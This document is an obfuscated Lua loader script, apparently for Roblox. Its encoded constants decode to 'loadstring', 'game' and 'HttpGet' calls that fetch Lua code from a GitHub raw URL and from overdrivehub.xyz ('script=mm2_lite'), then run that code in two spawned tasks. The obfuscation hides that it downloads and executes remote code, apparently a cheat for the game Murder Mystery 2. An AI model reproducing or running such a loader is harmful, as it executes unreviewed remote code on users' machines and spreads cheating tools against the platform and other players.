
local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then local v82=0;while true do if (v82==0) then v19=v0(v3(v30,1,1));return "";end end else local v83=v2(v0(v30,16));if v19 then local v90=v5(v83,v19);v19=nil;return v90;else return v83;end end end);local function v20(v31,v32,v33) if v33 then local v84=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-(620 -(499 + 56 + 64)))) + (932 -(857 + 74)))) ;return v84-(v84%(569 -(367 + (286 -85)))) ;else local v85=927 -(214 + 713) ;local v86;while true do if (v85==(0 + 0)) then v86=(1 + 1)^(v32-(878 -(282 + 595))) ;return (((v31%(v86 + v86))>=v86) and 1) or (1637 -(1523 + (1179 -(68 + 997)))) ;end end end end local function v21() local v34=1270 -((1183 -(892 + 65)) + 1044) ;local v35;while true do if (v34==(4 -3)) then return v35;end if (v34==(117 -((75 -43) + 85))) then v35=v1(v16,v18,v18);v18=v18 + (1 -0) + 0 ;v34=1 + 0 ;end end end local function v22() local v36=0 + (997 -(915 + 82)) ;local v37;local v38;while true do if (v36==(0 -0)) then v37,v38=v1(v16,v18,v18 + (352 -(87 + 263)) );v18=v18 + (182 -(67 + 113)) ;v36=1 + 0 ;end if (v36==(2 -(2 -1))) then return (v38 * 256) + v37 ;end end end local function v23() local v39,v40,v41,v42=v1(v16,v18,v18 + 2 + 1 );v18=v18 + (8 -4) ;return (v42 * (22064430 -5287214)) + (v41 * (143357 -77821)) + (v40 * 256) + v39 ;end local function v24() local v43=v23();local v44=v23();local v45=1 + 0 ;local v46=(v20(v44,1 -0 ,20) * ((2 + 0)^32)) + v43 ;local v47=v20(v44,812 -(368 + 423) ,97 -66 );local v48=((v20(v44,(30 + 20) -(10 + 8) )==1) and  -(3 -2)) or (443 -(416 + 26)) ;if (v47==(0 -0)) then if (v46==((0 -0) + 0)) then return v48 * 0 ;else v47=1 -0 ;v45=438 -(145 + 293) ;end elseif (v47==(2477 -((156 -112) + 386))) then return ((v46==(1486 -(998 + 488))) and (v48 * ((1 + 0)/((859 -(814 + 45)) + 0)))) or (v48 * NaN) ;end return v8(v48,v47-(1795 -(201 + (1406 -835))) ) * (v45 + (v46/((1140 -(116 + 56 + 966))^(216 -164)))) ;end local function v25(v49) local v50=0 + 0 ;local v51;local v52;while true do if (v50==((2801 -(1789 + 124)) -(261 + 624))) then return v6(v52);end if (v50==1) then v51=v3(v16,v18,(v18 + v49) -(1 -0) );v18=v18 + v49 ;v50=1082 -(1020 + (165 -105)) ;end if (v50==2) then v52={};for v91=(5585 -4161) -(6 + 624 + 793) , #v51 do v52[v91]=v2(v1(v3(v51,v91,v91)));end v50=9 -6 ;end if (v50==((766 -(745 + 21)) -0)) then v51=nil;if  not v49 then local v97=0 + 0 ;while true do if (v97==0) then v49=v23();if (v49==(0 -0)) then return "";end break;end end end v50=1748 -(760 + 987) ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return 0;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();local v60=(function() return;end)();while true do local v67=(function() return 166 -(9 + 157) ;end)();while true do if ((3 -2)~=v67) then else if (v53~=(1825 -(1195 + 629))) then else local v98=(function() return 0 -0 ;end)();while true do if (v98~=(241 -(187 + 54))) then else v58=(function() return {v55,v56,nil,v57};end)();v59=(function() return v23();end)();v98=(function() return 1;end)();end if ((781 -(162 + 618))~=v98) then else v60=(function() return {};end)();for v109= #":",v59 do local v110=(function() return 0 + 0 ;end)();local v111=(function() return;end)();local v112=(function() return;end)();while true do if (v110~=(1 + 0)) then else if (v111== #"]") then v112=(function() return v21()~=0 ;end)();elseif (v111==(1290 -(993 + 295))) then v112=(function() return v24();end)();elseif (v111== #"91(") then v112=(function() return v25();end)();end v60[v109]=(function() return v112;end)();break;end if (v110~=(0 -0)) then else local v184=(function() return 0;end)();while true do if (v184~=(1 -0)) then else v110=(function() return 1 + 0 ;end)();break;end if (v184==0) then v111=(function() return v21();end)();v112=(function() return nil;end)();v184=(function() return 1 + 0 ;end)();end end end end end v98=(function() return 1 + 1 ;end)();end if (v98==(1 + 1)) then v53=(function() return 2;end)();break;end end end break;end if (v67==0) then if ((1 + 1)==v53) then v58[ #"19("]=(function() return v21();end)();for v102= #"{",v23() do local v103=(function() return v21();end)();if (v20(v103, #",", #":")==(1636 -(1373 + 263))) then local v105=(function() return 1000 -(451 + 549) ;end)();local v106=(function() return;end)();local v107=(function() return;end)();local v108=(function() return;end)();while true do if (v105==0) then local v175=(function() return 0;end)();while true do if (v175~=(0 + 0)) then else v106=(function() return v20(v103,2, #"-19");end)();v107=(function() return v20(v103, #"xnxx",535 -(406 + 123) );end)();v175=(function() return 1 -0 ;end)();end if (v175==(1770 -(1749 + 20))) then v105=(function() return 1;end)();break;end end end if (v105==(1 -0)) then local v176=(function() return 1384 -(746 + 638) ;end)();local v177=(function() return;end)();while true do if (v176==(0 + 0)) then v177=(function() return 0 -0 ;end)();while true do if (v177==0) then local v223=(function() return 0;end)();while true do if ((341 -(218 + 123))==v223) then v108=(function() return {v22(),v22(),nil,nil};end)();if (v106==(0 + 0)) then local v226=(function() return 0;end)();local v227=(function() return;end)();while true do if (v226~=(0 + 0)) then else v227=(function() return 0 -0 ;end)();while true do if (v227==0) then v108[ #"91("]=(function() return v22();end)();v108[ #".dev"]=(function() return v22();end)();break;end end break;end end elseif (v106== #"]") then v108[ #"asd"]=(function() return v23();end)();elseif (v106==2) then v108[ #"asd"]=(function() return v23() -((1902 -(106 + 1794))^(576 -(306 + 254))) ;end)();elseif (v106== #"19(") then local v233=(function() return 0 + 0 ;end)();local v234=(function() return;end)();while true do if (v233~=0) then else v234=(function() return 0 -0 ;end)();while true do if (v234==0) then v108[ #"nil"]=(function() return v23() -((5 -3)^(1483 -(899 + 568))) ;end)();v108[ #"0313"]=(function() return v22();end)();break;end end break;end end end v223=(function() return 1 + 0 ;end)();end if (v223~=(585 -(57 + 527))) then else v177=(function() return 1428 -(41 + 1386) ;end)();break;end end end if (v177==(2 -1)) then v105=(function() return 605 -(268 + 335) ;end)();break;end end break;end end end if (v105==(293 -(60 + 230))) then if (v20(v107, #"19(", #"nil")== #"}") then v108[ #"xnxx"]=(function() return v60[v108[ #"asd1"]];end)();end v55[v102]=(function() return v108;end)();break;end if (v105~=2) then else if (v20(v107, #"|", #":")~= #" ") then else v108[2]=(function() return v60[v108[2]];end)();end if (v20(v107,2,2 + 0 )~= #">") then else v108[ #"91("]=(function() return v60[v108[ #"91("]];end)();end v105=(function() return 3;end)();end end end end for v104= #"\\",v23() do v56,v104,v28=(function() return v54(v56,v104,v28);end)();end return v58;end if (v53==0) then local v100=(function() return 0 -0 ;end)();local v101=(function() return;end)();while true do if (v100==(572 -(426 + 146))) then v101=(function() return 0 -0 ;end)();while true do if (v101==(0 + 0)) then v54=(function() return function(v210,v211,v212) local v213=(function() return 1456 -(282 + 1174) ;end)();local v214=(function() return;end)();while true do if (v213==(811 -(569 + 242))) then v214=(function() return 0;end)();while true do if (v214==(0 -0)) then local v224=(function() return 0 + 0 ;end)();local v225=(function() return;end)();while true do if (v224==(1024 -(706 + 318))) then v225=(function() return 0 + 0 ;end)();while true do if (v225==(0 -0)) then local v229=(function() return 0;end)();while true do if ((1251 -(721 + 530))~=v229) then else v210[v211-#" " ]=(function() return v212();end)();return v210,v211,v212;end end end end break;end end end end break;end end end;end)();v55=(function() return {};end)();v101=(function() return 1;end)();end if ((1273 -(945 + 326))==v101) then v53=(function() return 2 -1 ;end)();break;end if (v101~=1) then else v56=(function() return {};end)();v57=(function() return {};end)();v101=(function() return 2 + 0 ;end)();end end break;end end end v67=(function() return 1 + 0 ;end)();end end end end local function v29(v61,v62,v63) local v64=v61[1258 -(1043 + (495 -281)) ];local v65=v61[2];local v66=v61[3];return function(...) local v68=v64;local v69=v65;local v70=v66;local v71=v27;local v72=3 -2 ;local v73= -1;local v74={};local v75={...};local v76=v12("#",...) -(1 + 0) ;local v77={};local v78={};for v87=0 -0 ,v76 do if ((v87>=v70) or (4843==4084)) then v74[v87-v70 ]=v75[v87 + (581 -(361 + 219)) ];else v78[v87]=v75[v87 + (321 -(53 + 267)) ];end end local v79=(v76-v70) + 1 + 0 ;local v80;local v81;while true do v80=v68[v72];v81=v80[(650 -(141 + 95)) -(15 + 0 + 398) ];if (v81<=(990 -(18 + 964))) then if (v81<=(11 -8)) then if (v81<=1) then if ((4669>363) and (v81==((0 -0) + 0))) then for v170=v80[4 -2 ],v80[2 + 1 ] do v78[v170]=nil;end else do return;end end elseif (v81>2) then local v113=0 + 0 ;local v114;local v115;local v116;local v117;local v118;while true do if (v113==(853 -(20 + 830))) then v78[v118 + 1 + 0 ]=v117;v78[v118]=v117[v80[130 -((317 -201) + 10) ]];v72=v72 + 1 + 0 ;v80=v68[v72];v113=742 -(542 + 196) ;end if ((v113==(12 -(5 + 1))) or (1877>=3138)) then v72=v72 + 1 + 0 ;v80=v68[v72];v118=v80[2 + 0 ];v78[v118]=v78[v118](v13(v78,v118 + 1 + 0 ,v73));v113=18 -11 ;end if (v113==(9 -5)) then v78[v80[1553 -(1126 + 425) ]]=v80[408 -(118 + 287) ];v72=v72 + ((2 + 1) -2) ;v80=v68[v72];v118=v80[1123 -(118 + 1003) ];v113=(19 -5) -9 ;end if ((4742>=3626) and (v113==8)) then v80=v68[v72];do return;end break;end if (((377 -(142 + 235))==v113) or (3254==1655)) then v114=nil;v115,v116=nil;v117=nil;v118=nil;v113=4 -3 ;end if ((1 + 1)==v113) then v72=v72 + ((577 + 401) -(553 + 424)) ;v80=v68[v72];v118=v80[3 -1 ];v117=v78[v80[3 + 0 ]];v113=3 + 0 ;end if (v113==7) then v72=v72 + 1 + 0 ;v80=v68[v72];v78[v80[1 + (164 -(92 + 71)) ]]();v72=v72 + 1 + 0 ;v113=(9 + 8) -9 ;end if ((v113==5) or (4540==916)) then v115,v116=v71(v78[v118](v13(v78,v118 + ((2 -0) -1) ,v80[6 -3 ])));v73=(v116 + v118) -(1 + 0) ;v114=(765 -(574 + 191)) -0 ;for v215=v118,v73 do v114=v114 + (754 -(239 + 514)) ;v78[v215]=v115[v114];end v113=3 + 3 ;end if ((v113==(1330 -(797 + 532))) or (1156>4345)) then v78[v80[2 + 0 ]]=v63[v80[2 + 1 ]];v72=v72 + (2 -1) ;v80=v68[v72];v78[v80[2]]=v63[v80[1205 -(373 + 829) ]];v113=733 -(476 + 255) ;end end else local v119;local v120,v121;local v122;local v123;v78[v80[1132 -(369 + 761) ]]=v63[v80[2 + 0 + 1 ]];v72=v72 + (1 -0) ;v80=v68[v72];v78[v80[3 -(2 -1) ]]=v63[v80[241 -(33 + 31 + 174) ]];v72=v72 + 1 + 0 ;v80=v68[v72];v123=v80[2 -0 ];v122=v78[v80[(1188 -(254 + 595)) -(144 + 192) ]];v78[v123 + (217 -(42 + 174)) ]=v122;v78[v123]=v122[v80[4 + 0 ]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v80[(129 -(55 + 71)) + 0 ];v72=v72 + 1 + 0 ;v80=v68[v72];v123=v80[1506 -(363 + 1141) ];v120,v121=v71(v78[v123](v13(v78,v123 + (1581 -(1183 + 397)) ,v80[8 -5 ])));v73=(v121 + v123) -(1 + (0 -0)) ;v119=0 + (1790 -(573 + 1217)) ;for v172=v123,v73 do v119=v119 + (1976 -(1913 + 62)) ;v78[v172]=v120[v119];end v72=v72 + 1 + 0 ;v80=v68[v72];v123=v80[5 -3 ];v78[v123]=v78[v123](v13(v78,v123 + (1934 -(565 + 1368)) ,v73));v72=v72 + (3 -2) ;v80=v68[v72];v78[v80[1663 -(1477 + 184) ]]();v72=v72 + (1 -0) ;v80=v68[v72];do return;end end elseif ((2237<4249) and (v81<=5)) then if (v81>(4 + 0)) then v78[v80[858 -(564 + 292) ]]=v63[v80[(10 -6) -1 ]];else local v140=v80[5 -3 ];v78[v140](v78[v140 + (305 -(19 + 225 + 60)) ]);end elseif (v81<=(5 + 1)) then v72=v80[(771 -292) -(41 + 435) ];elseif ((v81>(1008 -(938 + 63))) or (1296==4910)) then v78[v80[2 + (939 -(714 + 225)) ]]=v80[3];elseif ((v78[v80[1127 -(936 + 189) ]]==v80[2 + 2 ]) or (2683<23)) then v72=v72 + ((4716 -3102) -(1565 + 48)) ;else v72=v80[(2 -0) + 1 ];end elseif ((3368==3368) and (v81<=(1150 -(782 + 356)))) then if (v81<=((30 + 247) -(176 + 91))) then if ((697<=826) and (v81==(23 -14))) then local v142=v80[2 -0 ];v78[v142]=v78[v142](v13(v78,v142 + (1093 -(975 + 117)) ,v73));else v78[v80[1877 -(157 + (2487 -769)) ]]={};end elseif ((1105<=1176) and (v81==(9 + 2))) then v78[v80[2]]=v29(v69[v80[(816 -(118 + 688)) -7 ]],nil,v63);else local v146=0 -0 ;local v147;local v148;local v149;local v150;while true do if ((3379<=3812) and (2643<3815) and (v146==2)) then for v219=v147,v73 do local v220=1018 -(697 + 321) ;while true do if (((48 -(25 + 23))==v220) or (788>=1616)) then v150=v150 + (2 -1) ;v78[v219]=v148[v150];break;end end end break;end if ((1913>493) and (v146==(0 -0))) then v147=v80[2];v148,v149=v71(v78[v147](v13(v78,v147 + (2 -1) ,v80[1 + 1 + 1 ])));v146=1 -0 ;end if ((4755>3428) and (v146==(2 -1))) then v73=(v149 + v147) -(1228 -(322 + 905)) ;v150=611 -(602 + 9) ;v146=1191 -((2335 -(927 + 959)) + 740) ;end end end elseif ((1381<=2369) and (v81<=(886 -(826 + (154 -108))))) then if (v81==(960 -(245 + (1434 -(16 + 716))))) then local v151;v78[v80[2]]=v78[v80[3]][v80[4]];v72=v72 + (3 -2) ;v80=v68[v72];v78[v80[2]]=v78[v80[1 + 2 ]];v72=v72 + 1 ;v80=v68[v72];v151=v80[1900 -(260 + 1638) ];v78[v151](v78[v151 + (441 -(382 + 58)) ]);v72=v72 + (3 -2) ;v80=v68[v72];v78[v80[2 + 0 ]]=v63[v80[(9 -4) -2 ]];v72=v72 + (2 -1) ;v80=v68[v72];v78[v80[1207 -(902 + 303) ]]=v78[v80[5 -2 ]][v80[9 -5 ]];v72=v72 + 1 ;v80=v68[v72];v78[v80[2]]=v78[v80[1 + 2 ]];v72=v72 + ((1788 -(11 + 86)) -(1121 + 569)) ;v80=v68[v72];v151=v80[216 -(22 + 192) ];v78[v151](v78[v151 + (684 -(483 + 200)) ]);v72=v72 + (2 -1) ;v80=v68[v72];v72=v80[1466 -(1404 + 59) ];else local v163=v80[2];local v164=v78[v80[8 -5 ]];v78[v163 + 1 ]=v164;v78[v163]=v164[v80[4 -0 ]];end elseif ((1854<=3379) and (v81<=15)) then v78[v80[767 -(468 + 297) ]]=v78[v80[3]];elseif (v81==16) then v78[v80[287 -(175 + 110) ]]();else v78[v80[2]]=v78[v80[3]][v80[566 -(334 + 228) ]];end v72=v72 + (3 -2) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!053Q00028Q00026Q00F03F027Q004003043Q007461736B03053Q00737061776E00344Q000A7Q001208000100016Q000200043Q00260700010008000100010004063Q00080001001208000200016Q000300033Q001208000100023Q00260700010003000100020004063Q000300014Q000400043Q00260700020018000100010004063Q00180001001208000500013Q00260700050012000100020004063Q00120001001208000200023Q0004063Q001800010026070005000E000100010004063Q000E00014Q000300033Q00020B00035Q001208000500023Q0004063Q000E000100260700020025000100020004063Q00250001001208000500013Q00260700050020000100010004063Q002000014Q000400043Q00020B000400013Q001208000500023Q0026070005001B000100020004063Q001B0001001208000200033Q0004063Q002500010004063Q001B00010026070002000B000100030004063Q000B0001001205000500043Q00200D0005000500054Q000600036Q00050002000100122Q000500043Q00202Q0005000500054Q000600046Q00050002000100044Q003300010004063Q000B00010004063Q003300010004063Q000300012Q00013Q00013Q00023Q00043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574035F3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F746F6269343337612F536372697074732F726566732F68656164732F6D61696E2F37353930383933372Q39666166382Q3261382Q30392Q62632E6C756100083Q0012033Q00013Q00122Q000100023Q00202Q00010001000300122Q000300046Q000100039Q0000026Q000100016Q00017Q00043Q00030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q747047657403303Q00682Q7470733A2Q2F6F76657264726976656875622E78797A2F3F643D61757468267363726970743D2Q6D325F6C69746500083Q0012033Q00013Q00122Q000100023Q00202Q00010001000300122Q000300046Q000100039Q0000026Q000100016Q00017Q00",v9(),...);